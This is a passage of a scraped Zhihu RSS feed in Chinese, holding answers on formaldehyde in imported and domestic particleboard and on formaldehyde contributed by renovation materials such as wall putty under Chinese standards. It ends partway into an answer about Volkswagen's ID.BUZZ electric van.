data-pid=\"A6_c_4iQ\">那我们继续看些数据。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a53aa8f3fd9333323981c6747ea49fd7_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2420\" data-rawheight=\"1248\" data-watermark=\"original\" data-original-src=\"v2-a53aa8f3fd9333323981c6747ea49fd7\" data-watermark-src=\"v2-acfaabc0b0ff9d5827ffb63e009b4592\" data-private-watermark-src=\"v2-ab2374e6e3a214419ffd40bd6d897e8a\"></p>\n<p data-pid=\"n8rpIdhQ\">看完出口，再看进口数据，似乎德国不但是出口第二，进口也是排第二呢？这怎么解释这一现象呢，进了158万吨，还出了131万吨，德国国内也完全没有这么大的消耗量，</p>\n<p data-pid=\"oZ1IdEg8\">就像一个地方，买了100斤面条进来，卖了90斤炒面出去。买进卖出为何般呢？</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0c1353c09e61d2a5853bf6146796fe9a_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2368\" data-rawheight=\"580\" data-watermark=\"original\" data-original-src=\"v2-0c1353c09e61d2a5853bf6146796fe9a\" data-watermark-src=\"v2-f06017d33cf83ecf79c175a046c82954\" data-private-watermark-src=\"v2-8d8f70cabf478383f0721617e3384421\"></p>\n<p data-pid=\"8QeWwz5r\">看完这段话，你说有没有一种可能，就是说德国对刨花板这个产品，主要扮演的是一个二道贩子的角色。从罗马尼亚，波兰等进口刨花板素板，然后自己贴面后变成了自己的高端产品--饰面刨花板。里里外外不但给国内供应了158-131=27万吨的刨花板，还能额外赚个7.93-7.92=0.01亿美元的差价，还是老牌资本主义会玩啊。</p>\n<p data-pid=\"RaMmgnPT\">这么一说就更合理了，这一张板子从欧洲穷国运到德国和奥地利，深加工一下，再运往地球另一边的中国，这一张板子游历世界后，做成家具说不定花了一年有余了，还有甲醛那还真不应该了。</p>\n<p data-pid=\"9saUgs_T\">要说他们不造无醛板也不对，比如爱X也会用PMDI胶了，比如欧松板产品。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e51f85c9ffe3b6ff2c8b28a062bc7cd0_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2290\" data-rawheight=\"1718\" data-watermark=\"original\" data-original-src=\"v2-e51f85c9ffe3b6ff2c8b28a062bc7cd0\" data-watermark-src=\"v2-e1c361db5695e2fd87821ce8bd007abb\" data-private-watermark-src=\"v2-9af385f868e60430d3545f01d4c845f2\"></p>\n<p data-pid=\"a_xKnv6T\">谁都知道无醛是未来的趋势，但是脲醛树脂刨花板的钱对他们来说，太好赚了，关键是国人真的信啊！他们一张板能赚100多，国产自己的板子赚不到10块钱，还要背上不环保的骂名，<b>这个节骨眼上，真的只有国产板材厂还会考虑弯道超车这个思路，一鼓作气坚决开发真正的无醛板。</b></p>\n<p><br></p>\n<h2><b>无醛的诞生</b></h2>\n<p data-pid=\"dvc_JhVT\">中国想开发被自己人认可的人造板，难度很大，首先进口板材的声望一直很高，不但销量高，价格还能做到居高不下，哪怕拿着一模一样的产品，也很难在市场立足，只能一边挨骂一边去切低端的市场。</p>\n<p data-pid=\"_8C6WrUy\">寻求变化的方向有很多，比如避开锋芒，换基材。中国对森林资源的缺乏，以及坚决得退耕还林政策，从2017年，已经全部禁止砍伐任何国有或集体的天然林场了，所以我们的木材主要依赖进口，哪怕是做人造板的基材的针叶材也得先进口原木，然后捣碎了制作板材，所以我们的实际成本本身就比欧洲还要高。</p>\n<p data-pid=\"DFHmyluF\">比如竹子，中国产竹大国，而且生长周期短，原料也好取，大家也看到了市面上出现的各种竹集成材，却很难替代三大板（刨花板，密度板，胶合板）的市场，一是因为竹材成本并不算低，密度高，处理的难度高于木材。二是纤维长，想做成刨花板和密度板都不容易，只好做成竹片拼合材料。</p>\n<p data-pid=\"OySPYpmc\">这时一种材料进入到大家的视野里，秸秆。中国每年有9亿多吨的秸秆产量，本身这些东西在以前就是烧了或者喂牲口了，还存在着火的隐患，现在用来生产板材岂不是美哉。</p>\n<p data-pid=\"1OmQrFe1\">但是事与愿违，秸秆的材料特性，让它与脲醛树脂无法很好得产生黏着性，试产出来的板材没法达到通用的人造板的工艺要求，而MDI胶却能驾驭住这种材料的粘合，考虑到原材料的易得性，胶贵点就贵点吧，毕竟环保啊，终于推出了我们在市场上首次听到的国产无醛板---麦秸板。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d05489ec7f25b847f67e2f37fc43d675_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1144\" data-rawheight=\"858\" data-watermark=\"original\" data-original-src=\"v2-d05489ec7f25b847f67e2f37fc43d675\" data-watermark-src=\"v2-45ffb632d9fb4ad995807979d0b8c723\" data-private-watermark-src=\"v2-96760f5f845eb138ee246fbb1b8c7510\"></p>\n<p data-pid=\"GETX87_L\">当年勇敢的打出无醛板的称呼，后果很明显，信的人并不多。大部分消费者认为，中国人的技术不可能那么容易就超过欧洲的，欧洲都还在说E1，你居然敢说你无醛？假的！</p>\n<p data-pid=\"cRt0GG-3\">没错，这种事情可常见了，<b>中国技术的对手不是国外，而是自己人心中的成见。</b></p>\n<p data-pid=\"SDau2_Gg\">随后又推出了大家更熟悉的禾香板，禾香板是把秸秆打得更碎以便更好得贴饰面，丰富的花色和纹理才能与进口刨花板展开真正的正面较量。</p>\n<p data-pid=\"FZU8INua\">尽管原材料的费用得到了降低，到那时MDI胶的成本却上升了不少，而且所使用的的MDI胶也依赖进口，比如巴斯夫和科思创，所以导致早几年的麦秸板和禾香板其实价格并不便宜，还一度被认为是智商税产品。</p>\n<p data-pid=\"-3BmKDdU\">现在万华站起来后，MDI胶也是国产占主导了，价格也随之降低，国内也在2021年开始实施全新的甲醛释放标准，已经比欧盟，日本和美国要求的甲醛更低，也是源于对国内无醛板未来的生产能力有了足够的信心。</p>\n<p data-pid=\"ezyOdzf7\">有了胶的支持，国内的人造板厂也站起来了，很多板材厂以及全屋定制厂商联合新的国标一起推出了各种无醛板，来给国人提供真正的无醛产品。但是市场教育还需要时间，现在大部分人依然还在追求爱X的脲醛树脂刨花板产品，而国产MDI产品的推广却依然阻力重重，不信任，没人气，就当是那些年对国产刨花板粗放增长的教训吧。</p>\n<p><br></p>\n<h2><b>甲醛的“消失”</b></h2>\n<p data-pid=\"UiX23oS7\">甲醛并不会消失，所以这是个“标题党”。</p>\n<p data-pid=\"2qnMTnQK\">自然界处处有甲醛，微量不足为虑，我指的消失，是对甲醛顾虑的消失。</p>\n<p data-pid=\"ZpK2v--t\">我之前的结论是，关注甲醛主要就关注脲醛树脂的问题就足够了。不是说室内没有其他甲醛释放源，而是那些释放是可以轻松解决的，比如一些测评机构甚至会去测试筷子，百洁布等等产品的甲醛含量，这些东西一是体量太小，是典型的抛弃剂量谈毒性的问题，目的就是制造焦虑。二则，这些东西是需要频繁清洗过水的，而且第一次使用之后，无论甲醛有多高，都将会降到可忽略的程度。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-eb7ccb7cbfd44b53121902165d62d928_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2536\" data-rawheight=\"666\" data-watermark=\"original\" data-original-src=\"v2-eb7ccb7cbfd44b53121902165d62d928\" data-watermark-src=\"v2-33c4a0d4199997be40a142af4920dcaf\" data-private-watermark-src=\"v2-9a00a7851a6abc00737844e838e94dab\"></p>\n<p data-pid=\"lGVqCXqY\">纺织品如窗帘，衣物都是同理，甲醛在其中的用量并不小，室内装饰比如窗帘产品300mg/kg都属于正常限定，所以没事别直接去闻那些新开袋的纺织品，洗洗再穿是很有必要的。</p>\n<p data-pid=\"8T8lPE8l\">只需关注脲醛树脂的另一个原因，是释放周期的问题。类似墙漆，壁纸，家具漆、室内装修中的胶水通常都能在数日内释放得差不多了，而且这种胶水不像是脲醛树脂一样影响的是整个产业链，一改就是数亿的资金投放，比如壁纸壁布行业，现在大部分都在使用大豆胶或其他生物无醛胶，因为需求并不大，而且随时可替换，国内稍微有点进步意识的厂商早就换了。</p>\n<p data-pid=\"d4tfJ-Mt\">所以应对这些问题只要装修后留点时间散散味，都不易受其影响。而脲醛树脂的甲醛释放，是真的漫长且高能，之前讲过甲醛释放有回升滞后的现象，如果家具有遇水或者损坏，时间长封边条开胶等等情况，那相当于开启了甲醛的阀门，甚至在你悄无声息的时候加大了剂量，防不胜防。</p>\n<p data-pid=\"3rXF5QUI\">所以之前我对客户的推荐里，从来都不会推荐脲醛树脂的人造板产品，因为我知道无论进口还是国产，首先甲醛是一定存在的，或多或少，这是材料生产工艺决定的。而且任何品牌的产品甲醛释放情况都是随机的，或者说变量很大，变量跟板材生产批次有关，也跟封边水平有关，跟制作工艺和安装水平有关等等太多因素，所以我唯一的办法就是不去赌。使用实木定制，或使用MDI刨花板或禾香板，或使用PMDI欧松板，麦秸板等等跟甲醛完全无关或者释放极低极低的产品。</p>\n<p data-pid=\"TqFdYH2K\">我的结论很简单，中国给出了世界最低甲醛排放标准里的Enf，就是意味着国产的无醛板材能作为全世界新的人造板标杆，完全不需要再从进口板材里找安慰，国产无醛真的已经来了。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-hao-cheng?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">王昊诚</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/520043296/answer/2381062750?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">19 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/474296430?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">最近家中装修，有哪些值得推荐的「低甲醛」家居板材？</a><br><a href=\"http://www.zhihu.com/question/447548127?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">板材散一段时间味道再制作家具，甲醛含量会少吗？</a><br>\n","link":"http://www.zhihu.com/question/520043296/answer/2381062750?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"甲醛重灾区只存在于家具板材吗？","date":"2022-03-10 07:29:49","description":"\n<p data-pid=\"8UOJtolL\">结论放最前面：</p>\n<blockquote data-pid=\"TGUTZ-CH\"><b>相比于追求“极致环保的实木家具”，“谈胶色变”，“高价进口儿童乳胶漆”，把墙面腻子从国标换成十环认证的，总共可能也花不了几百块钱，但是效果会比你画十几万把家具全部换掉还明显，这绝对是家装中性价比最高的一环。</b></blockquote>\n<hr>\n<p data-pid=\"DTFFveTw\">在装修这件事上有一句话的传播度非常高——“无醛不成胶”，胶被作为了室内装饰的最主要甲醛来源，比如大家都会很重视木质家具的甲醛释放，因为它们在生产过程中会大量使用到各种胶，甚至于在判断木质家具的质量时，首先就回去问胶用的多不多，似乎胶少就环保，胶多就不环保。但是我一直有个疑问，“胶”里也许有甲醛，那其他的装修材料里有没有，它们各自又是怎样的比例呢？</p>\n<p data-pid=\"8VbBa_6w\">这次正好借着知乎的活动，我想系统的梳理一下这个问题。因为能力有限，时间也比较紧张，没有把每一种装修材料都拿来做一个测试（考虑到每一种里面又可能有各种各样的产品，确实也不现实），最后决定先从《GB 50325 民用建筑工程室内环境污染控制规范》入手。在这个规范里详细列举了室内装饰可能用到的各种材料的污染限制，我们发现像水泥、瓷砖、都没有甲醛限额这一条的，那么我们可以认为这些材料基本也就不含有甲醛，不考虑，其余有甲醛限量的材料是：</p>\n<p data-pid=\"tCTIHmU_\">1. 人造木板及饰面人造木板</p>\n<p data-pid=\"_r1rmkF8\">2. 胶粘剂</p>\n<p data-pid=\"-8wjcjup\">3. 水性处理剂（防火、防水、防腐涂料）</p>\n<p data-pid=\"fjkf35IA\">4. 混凝土外加剂</p>\n<p data-pid=\"Y6UrgoiV\">5. 壁纸/壁布，水性墙面涂料</p>\n<p data-pid=\"ViuXzkAN\">6. 帷幕</p>\n<p data-pid=\"mYjHMDE-\">7. 地毯</p>\n<p data-pid=\"4WoO4GY7\">8. 水性墙面腻子</p>\n<p data-pid=\"we-cIu3l\">我们的直观感觉，甲醛主要的来源应该是人造木板及饰面人造木板和胶粘剂，另外大家在购买乳胶漆的时候也特别注意甲醛含量，我们接下来就根据规范结合一个100平左右的两居室的用量，计算一下具体情况如何。</p>\n<hr>\n<h2>一. 人造木板及饰面人造木板</h2>\n<p data-pid=\"T32LTt2n\">使用干燥器法测定的人造木板及其制品的游离甲醛释放量不应大于1.5mg/L，除此之外，在最新的《GB/T 39600-2021 人造板及其制品甲醛释放量分级》中，最高的Enf级限量是0.025mg/L，必须说这个最新的Enf级还是挺高的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-55d663b3ca2be7686d0f646d0e8972e6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"226\" data-watermark=\"watermark\" data-original-src=\"v2-55d663b3ca2be7686d0f646d0e8972e6\" data-watermark-src=\"v2-d906984aa7cdb8b5ec2734a14b388790\" data-private-watermark-src=\"v2-622d70bb9d22e1cfa1ef389d8100f82a\"></p>\n<hr>\n<h2>二. 胶粘剂</h2>\n<p data-pid=\"Ju3APypr\">粘接剂类的限量应该符合《GB 30982建筑胶粘剂有害物质限量》：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-22a563c448822e235152a1de4bf9fcd3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"312\" data-watermark=\"watermark\" data-original-src=\"v2-22a563c448822e235152a1de4bf9fcd3\" data-watermark-src=\"v2-2400d04998e46de0673e317bf6bed172\" data-private-watermark-src=\"v2-5457615c109adf3bbe9d3261ba6cccc0\"></p>\n<p data-pid=\"fsudvdzK\">有害物限量基本在0.5到1g/kg，需要注意的是，安装门窗使用的比较多的“发泡胶”属于聚氨酯类粘接剂，这一类基本不含甲醛，所以标准中也没有做规范。</p>\n<p data-pid=\"ZL9CX-8x\">家装中另一种常见的就是“玻璃胶”，是硅酸酮类粘接剂，两居室我们按照10管300ml计算，密度1.25，合计是3.75KG，游离甲醛总含量就是3.75g。 </p>\n<hr>\n<h2>三. 水性处理剂（防火、防水、防腐涂料）</h2>\n<p><img src=\"https://pic4.zhimg.com/v2-39231deda6502c471b0f349721c20578_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"838\" data-rawheight=\"202\" data-watermark=\"watermark\" data-original-src=\"v2-39231deda6502c471b0f349721c20578\" data-watermark-src=\"v2-981b8de06592e9d8c3bc9fe91aa90730\" data-private-watermark-src=\"v2-6e7feb104f0d55bff6ef8a448a23d436\"></p>\n<p data-pid=\"oM7xYmUR\">水性处理剂的限量是100mg/kg，一般来说室内家装最主要的是防水涂料，按一厨一卫计算一般需要一桶半的防水，一桶18KG，就是27KG，合计2.7g。</p>\n<p data-pid=\"xpSbLzXO\">注意哦，<b>防水涂料的甲醛总含量感觉并不比“胶”低太多，基本上是一个水准。</b></p>\n<hr>\n<h2>四. 混凝土外加剂</h2>\n<p><img src=\"https://pic2.zhimg.com/v2-f35171bcdd08c585574683566da71865_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"812\" data-rawheight=\"140\" data-watermark=\"watermark\" data-original-src=\"v2-f35171bcdd08c585574683566da71865\" data-watermark-src=\"v2-ae7206d9e01b92f91097103cc42481be\" data-private-watermark-src=\"v2-8a247737722b95bf74e497779f442aa3\"></p>\n<p data-pid=\"G83CUzm_\">限量是500mg/kg，但是这个基本很少在家装中使用，就不考虑了。</p>\n<hr>\n<h2>五. 壁纸/壁布，水性墙面涂料</h2>\n<p data-pid=\"UxNCpmqA\">壁纸壁布的甲醛含量要符合《GB 18585室内装饰装修材料壁纸中有害物质限量》</p>\n<p><img src=\"https://pic3.zhimg.com/v2-0ed102ea250e7b0b471a3ecee6599034_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"480\" data-watermark=\"watermark\" data-original-src=\"v2-0ed102ea250e7b0b471a3ecee6599034\" data-watermark-src=\"v2-bc95eff7598096f2b68fcb79338dff8a\" data-private-watermark-src=\"v2-8f3157aee8c98816f1b414a1ca9e32a2\"></p>\n<p data-pid=\"bFItuN_T\">水性墙面涂料，也就是我们说的乳胶漆，要符合《GB 18582建筑用墙面涂料中有害物质限量》</p>\n<p><img src=\"https://pic3.zhimg.com/v2-0fc67bcb20b355efcf3cc2ececaae309_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"388\" data-watermark=\"watermark\" data-original-src=\"v2-0fc67bcb20b355efcf3cc2ececaae309\" data-watermark-src=\"v2-f532ddc31de8f8a853e37c1f36929982\" data-private-watermark-src=\"v2-ee482e5e9d34094d4f13d63a0be1db35\"></p>\n<p data-pid=\"mCc3WiIs\">特别有意思，市场上很多人说漆有甲醛，壁纸没有甲醛，但是实际上国家规范里面，壁纸中的甲醛限量是乳胶漆的2倍还多，注意这里还不包含壁纸胶，壁纸胶中还有一部分甲醛：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-28cff449bb140f4f3681f5eeb8eb95c2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"247\" data-watermark=\"watermark\" data-original-src=\"v2-28cff449bb140f4f3681f5eeb8eb95c2\" data-watermark-src=\"v2-e3d1f3ab48514ddd94122de14dffad91\" data-private-watermark-src=\"v2-2ef3275aa04d7a3c94fa83accc4e5c8c\"></p>\n<p data-pid=\"sST1eFkS\"><b>如果算上壁纸胶，贴壁纸的甲醛限量，是乳胶漆的4倍多。</b></p>\n<p data-pid=\"9b6K5BeM\">我们还是甲醛限量更低的乳胶漆来算，100平两居室，大概需要35L左右的，密度按1.3算，是45.5KG，那么合计甲醛是2.275g，如果是壁纸+壁纸胶的话，这个限量应该在5g以上了。</p>\n<hr>\n<h2>六. 帷幕/软包、地毯</h2>\n<p data-pid=\"65S7yjNk\">窗帘、软包这些织物的甲醛释放量不应大于0.124mg/m³，这里用的是环境仓法，不好和上面的数据直接比较，不过这个数值和人造板环境仓法的数值是一样的！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fb8797be4239cddc92760538fafdc9e3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"793\" data-rawheight=\"100\" data-watermark=\"watermark\" data-original-src=\"v2-fb8797be4239cddc92760538fafdc9e3\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"3wdQfQkG\">也就是说，<b>窗帘，软包这些我们可能觉得无害的物品，在甲醛含量上，可能和木质人造板是差不多的</b>，也需要注意起来。</p>\n<hr>\n<h2>七. 地毯</h2>\n<p><img src=\"https://pic2.zhimg.com/v2-f0e1436d4aa8e8a20d8df2623d76b200_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"392\" data-watermark=\"watermark\" data-original-src=\"v2-f0e1436d4aa8e8a20d8df2623d76b200\" data-watermark-src=\"v2-bff235a197596098dcb668b831342881\" data-private-watermark-src=\"v2-5760920c3244c0148df45fd3730d2f70\"></p>\n<p data-pid=\"w-l9LUx_\">我们按照3米层高算，铺地毯的房间12h大约会积累0.4mg/m³的甲醛浓度，这个值是</p>\n<p data-pid=\"sKbBysfc\">《GB/T 18883 室内空气质量标准》要求甲醛限制0.1mg/m³的4倍，有点滑稽是不是，就是房间里面铺上地毯，其他什么都不放，甲醛就可能超标4倍，而这个地毯还是符合国家规范的。</p>\n<p data-pid=\"mR67geHJ\"><b>如果家里要铺地毯……一定要买好一点的。</b></p>\n<hr>\n<h2>八. 水性墙面腻子</h2>\n<p><img src=\"https://pic3.zhimg.com/v2-3f058e17d7311b98c3fa30ed9f6e502a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"208\" data-watermark=\"watermark\" data-original-src=\"v2-3f058e17d7311b98c3fa30ed9f6e502a\" data-watermark-src=\"v2-acc947bef5037eb3c3a70072b4dec25b\" data-private-watermark-src=\"v2-855b700cd0ceff9120b1db1fd857400c\"></p>\n<p data-pid=\"feX1Ix0B\">腻子我是没有想到的，本来我也觉得腻子中不应该含有甲醛，但是实际上，腻子的甲醛限量比乳胶漆反而高出一倍，更重要的是，腻子的使用量要大得多。</p>\n<p data-pid=\"DgxVjojS\"> 一个100平的两居室，如果全部重新装修，大约需要30袋18KG包装的腻子，是540KG，换算下来含有54g游离甲醛。是前面我们提到的胶、乳胶漆等等的几十倍！但是这一块几乎没有人注意，老实说，我认为很大程度上是因为腻子一般是由装修队购买而非业主决策，所以炒作“环保腻子”不挣钱。</p>\n<p data-pid=\"SJ3K3Vj3\">查到这里我有点怀疑，是不是国标《GB 50325 民用建筑工程室内环境污染控制规范》定的太低，然后又去查了一下目前国内最高水平的十环认证标准。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e3d0ba3823fa0b56603d58108070a257_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"700\" data-watermark=\"watermark\" data-original-src=\"v2-e3d0ba3823fa0b56603d58108070a257\" data-watermark-src=\"v2-b6875ac79111d97c3aa04970c747eb86\" data-private-watermark-src=\"v2-22eea7447d01886710343a2400ccdb33\"></p>\n<p data-pid=\"Vf6hqoUV\">这里的甲醛限量要低一倍，是50mg/kg，但是结合上腻子超大的用量，这个值仍然非常可怕。</p>\n<hr>\n<h2><b>结论</b></h2>\n<p data-pid=\"VsrCWnZs\">我们把前述可以定量的甲醛总量做一个汇总，会发现硬装部分会引入62.72g游离甲醛，而这其中的大部分，在于墙面腻子。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b49c578d6b6c989f134e778f41f60b43_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"481\" data-rawheight=\"109\" data-watermark=\"watermark\" data-original-src=\"v2-b49c578d6b6c989f134e778f41f60b43\" data-watermark-src=\"v2-c2844bc9228050c679ee275310fb40cb\" data-private-watermark-src=\"v2-4195c5193f347c85b76cb2fb92c05360\"></p>\n<p data-pid=\"MbY1ekJp\">我们假定这些甲醛会在1年内释放干净，那么100平，3米层高的空间，每12h需要0.28mg/m³的释放量，是《GB/T 18883 室内空气质量标准》的两倍多，如果半年内示范干净，这个至是国标的五倍多。</p>\n<p data-pid=\"azXVi-bp\">由此可以推出，<b>即使不购买任何家具软装，仅仅是硬装部分引入的甲醛，在装修完成的初期，一定会有一个非常高强度的释放过程，这一点不是你画多少钱买“环保家具”可以解决的，所谓的除甲醛治理（在家具上喷涂药剂）也没有效果，唯一的方法，就是装修完以后，有一段足够长的通风时间，经过空气检测，甲醛含量足够低以后再入住。</b></p>\n<p data-pid=\"peRZzzGv\">另外，如果我们选用达到十环认证的腻子，几乎可以将甲醛总量减半（62.72到35.72）。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-820f61de6fd86b63c56ac353957990d2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"479\" data-rawheight=\"111\" data-watermark=\"watermark\" data-original-src=\"v2-820f61de6fd86b63c56ac353957990d2\" data-watermark-src=\"v2-4dcc12db4826adf0cf48bbf68b270a35\" data-private-watermark-src=\"v2-18a949ec986d5cd4ab93fe0c62b1c75e\"></p>\n<p data-pid=\"pnm90TL-\"><b>相比于追求“极致环保的家具”，“谈胶色变”，“追求进口儿童乳胶漆”，把墙面腻子从国标换成十环认证的，总共可能也花不了几百块钱，但是效果会比你画十几万把家具全部换掉还明显，这绝对是家装中性价比最高的一环。</b></p>\n<hr>\n<h2>局限性</h2>\n<p data-pid=\"35DI4WtK\">1、本文仅讨论了《GB 50325 民用建筑工程室内环境污染控制规范》中有明确甲醛限量的装修材料，另有一些材料，比如<b>人造石可能也会有较高的甲醛含量</b>，但是暂时没有查到相关国家规范，故未在文中考虑。</p>\n<p data-pid=\"f0n8Mz1t\">2、文中材料有两种甲醛限量形式，人造木板及饰面人造木板、窗帘软包、地毯采用的使用的是甲醛释放量指标，其他材料使用的是甲醛含量指标，两者之间难以精确换算，本文主要讨论了后者。</p>\n<p data-pid=\"klZL5k_3\">3、在采用甲醛含量指标的材料一系列材料里，他们各自的释放速度也不相同，可能有些释放块，有些释放慢，通风情况和温度可能也会有不一样的影响，本文没有深入调查各自在不同条件下的释放曲线，但是不影响最后结论。</p>\n<p data-pid=\"qBh5Um_r\">4、本文提高的100平米2居室装修各种材料的用量都是粗略估算，实际情况可能根据户型、地域、装修风格等因素而有不同，但是不影响整体比例，对最后结论无显著影响。</p>\n<hr>\n<p data-pid=\"N0DSmIX6\">最后，感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/4db4fcecb19acf43f55b865f22a93e5c\" data-hash=\"4db4fcecb19acf43f55b865f22a93e5c\" data-hovercard=\"p$b$4db4fcecb19acf43f55b865f22a93e5c\">@知乎家居</a>  邀请，成为「家装真探社 01 号事件」特邀真探！</p>\n<p data-pid=\"6dTZ2xUf\"><b>END</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yi-bei-jiu-4?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">逸杯酒</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/520043296/answer/2380925107?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">19 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/474296430?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">最近家中装修，有哪些值得推荐的「低甲醛」家居板材？</a><br><a href=\"http://www.zhihu.com/question/447548127?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">板材散一段时间味道再制作家具，甲醛含量会少吗？</a><br>\n","link":"http://www.zhihu.com/question/520043296/answer/2380925107?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"我这里只能让它变长一点：我与富士「电老虎」的七年之痒","date":"2022-03-10 06:29:59","description":"终极的那一台 X-Pro 终将落入囊中，但这走过的每一条道路，拍过的每一张照片，都会是这长路之中的一笔印迹。<a href=\"https://sspai.com/post/64336\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/64336"},{"title":"大众发布电动面包车 ID.BUZZ，带有诸多 T1 元素，该款电动 MPV 还有哪些值得关注的地方？","date":"2022-03-10 05:51:33","description":"\n<p data-pid=\"IS1syF7z\">在地表的每个国度，几乎都会长期存在一款面包车，可客运用途、可货运用途，任劳任怨全球劳模。咱们中国的面包神车有全顺、金杯、小康，最屌的当属<b>五菱宏光</b>。而这类车在欧洲也被称为“Eurovans”，它们不单纯作为拉货的厢式货车，还会被用作出租车、酒店接驳以及商务场景等用途。</p>\n<h3><b>T1变ID，我的心情有点滴滴滴，经典换新装点燃情怀，还能看一眼就爱吗</b></h3>\n<p><img src=\"https://pic4.zhimg.com/v2-b53ffe2626876079554ddd2613dfd5e4_720w.jpg?rss\" data-rawwidth=\"1728\" data-rawheight=\"720\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b53ffe2626876079554ddd2613dfd5e4\" data-watermark-src=\"v2-eb49b5364fa75317e26b9b058f9434f3\" data-private-watermark-src=\"v2-b6df9194673d5de725a635f5828b85c9\"></p>\n<p data-pid=\"MdiPEsJf\">鉴于自己喜爱经典老爷车，老婆大人因为喜欢T1买了几个不同版本的放在家玻璃柜，经常拿来把玩，如今已经变成我儿的玩具了。</p>\n<p data-pid=\"ioliy8A8\"><b>这里我们得讲讲T1的前世今生，</b>每款车型在主机厂内部都有一个响亮厂家代号来识别，以便于对其定位和项目的管理，如丰田有AE86，东风新能源越野品牌M。而在德国大众，懂车喜欢车的人都熟悉的开山鼻祖<b>“Type 1”代号就是甲壳虫</b>。在甲壳虫之后，大众历史上第二款车型“Type 2”就是1950年推出的T1厢式客车。</p>\n<ul><li data-pid=\"Pm7_3B3F\">当你看到T1的照片，我肯定你见过它，在无数的怀旧电影中它都有它的身影</li></ul>\n<p><img src=\"https://pic1.zhimg.com/v2-659dc46ae7996fb36009d0ae0831d82e_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"607\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-659dc46ae7996fb36009d0ae0831d82e\" data-watermark-src=\"v2-2b58e28ed90b4207e5d063f8ee6fd1af\" data-private-watermark-src=\"v2-ade71fc554f6d8bd5464c869ff1f99ab\"></p>\n<ul><li data-pid=\"lThWyXBB\">还有动画《赛车总动员》的Fillmore，它的原型车正是大众T1。</li></ul>\n<p><img src=\"https://pic1.zhimg.com/v2-513718367718574ba2c7781bf79b74c0_720w.jpg?rss\" data-rawwidth=\"640\" data-rawheight=\"400\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-513718367718574ba2c7781bf79b74c0\" 